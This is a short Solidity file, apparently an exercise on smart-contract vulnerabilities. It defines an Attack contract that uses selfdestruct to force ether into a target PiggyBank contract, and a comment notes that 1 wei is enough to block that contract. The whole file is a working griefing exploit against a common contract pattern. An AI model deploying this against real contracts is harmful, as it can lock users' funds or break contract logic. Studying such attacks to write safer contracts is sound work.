// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./PiggyBank.sol";

contract Attack {
    PiggyBank c;

    constructor(PiggyBank _contractAddress) {
        c = PiggyBank(_contractAddress);
    }

    function attack() public payable {
        selfdestruct(payable(address(c))); //1wei it's enough to block the piggyBank contract
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
